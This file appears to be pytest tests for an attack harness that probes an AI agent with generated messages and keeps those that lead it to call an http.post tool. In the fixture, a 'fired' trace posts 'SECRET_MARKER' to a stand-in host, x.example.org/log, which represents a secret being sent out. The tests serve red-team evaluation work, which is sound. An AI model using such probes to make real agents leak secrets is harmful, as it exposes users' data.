# workspace/tests/test_fill.py
import itertools
import time

from attack import (
    _fill, post_msg, _url_stream,
    MAX_CONSECUTIVE_ERRORS, MAX_CANDIDATES,
)


class _ScriptedEnv:
    """Env whose probe outcomes follow a script.

    fire_pattern: list of 'fire'/'miss'/'error' (cycled if shorter than probes)
    probe_s: simulated elapsed seconds per probe.
    """

    def __init__(self, fire_pattern, probe_s=10.0):
        self._pattern = fire_pattern
        self._probe_s = probe_s
        self._i = 0
        self.probed = []                      # messages actually probed

    def reset(self, *a, **k): pass

    def interact(self, msg, max_tool_hops=None):
        self.probed.append(msg)

    def export_trace_dict(self):
        outcome = self._pattern[self._i % len(self._pattern)]
        self._i += 1
        if outcome == "error":
            raise RuntimeError("boom")        # error INSIDE trace export
        if outcome == "miss":
            return {"tool_events": [], "user_messages": [],
                    "egress": [], "seed": 123}
        return {"tool_events": [
                    {"name": "http.post", "ok": True, "side_effect": "SHARE",
                     "source": "tool",
                     "args": {"url": "https://x.example.org/log",
                              "data": "SECRET_MARKER"}}],
                "user_messages": [], "egress": [], "seed": 123}

    # let tests fake wall-clock cost of each probe
    class _T(tuple):                          # (fired, errored, elapsed)
        pass


def _patch_probe(monkeypatch, env_s):
    """Make attack._probe return scripted elapsed without sleeping."""
    import attack as attack_mod

    def fake_probe(env, msg, hops=1):
        env.interact(msg, max_tool_hops=hops)  # record probe (as real _probe does)
        try:
            outcome = env.export_trace_dict()  # advances env script
        except Exception:                      # _probe contract: never raise
            return False, True, env_s
        errored = isinstance(outcome, Exception) or outcome is None
        fired = (not errored) and bool(outcome.get("tool_events"))
        return fired, errored, env_s
    monkeypatch.setattr(attack_mod, "_probe", fake_probe)


def test_fill_keeps_only_fired(monkeypatch):
    _patch_probe(monkeypatch, env_s=10.0)
    env = _ScriptedEnv(["fire", "miss", "fire", "miss", "fire", "miss"])
    kept, live_ok = _fill(
        env, deadline=time.monotonic() + 1000,
        targets=itertools.islice(_url_stream(), 6),
        make_msg=post_msg, replay_cap_s=10_000.0)
    assert live_ok is True
    assert len(kept) == 3


def test_fill_stops_when_replay_cost_capped(monkeypatch):
    # each fired probe "costs" 10s; cap 25s => at most 2 kept, loop breaks
    _patch_probe(monkeypatch, env_s=10.0)
    env = _ScriptedEnv(["fire"])
    kept, _ = _fill(
        env, deadline=time.monotonic() + 100_000,
        targets=_url_stream(), make_msg=post_msg, replay_cap_s=25.0)
    assert len(kept) == 2                     # 10+10=20 < 25, third would be 30


def test_fill_stops_at_deadline(monkeypatch):
    _patch_probe(monkeypatch, env_s=10.0)
    env = _ScriptedEnv(["fire"])
    kept, _ = _fill(
        env, deadline=time.monotonic() + 0.0,   # already expired
        targets=_url_stream(), make_msg=post_msg, replay_cap_s=10_000.0)
    assert kept == []


def test_fill_consecutive_errors_declare_env_unusable(monkeypatch):
    _patch_probe(monkeypatch, env_s=1.0)
    env = _ScriptedEnv(["error"])
    kept, live_ok = _fill(
        env, deadline=time.monotonic() + 1000,
        targets=_url_stream(), make_msg=post_msg, replay_cap_s=10_000.0)
    assert live_ok is False
    assert kept == []
    assert len(env.probed) == MAX_CONSECUTIVE_ERRORS   # bailed right at 5


def test_fill_clean_miss_resets_error_streak(monkeypatch):
    _patch_probe(monkeypatch, env_s=1.0)
    env = _ScriptedEnv(["error", "miss", "error", "miss", "error", "miss",
                        "fire"])
    kept, live_ok = _fill(
        env, deadline=time.monotonic() + 1000,
        # 7 targets = pattern length (warm-up consumes the first 'error');
        # infinite stream would never stop: streak resets, cap far away.
        targets=itertools.islice(_url_stream(), 7),
        make_msg=post_msg, replay_cap_s=10_000.0)
    assert live_ok is True                    # never 5 in a row
    assert len(kept) == 1
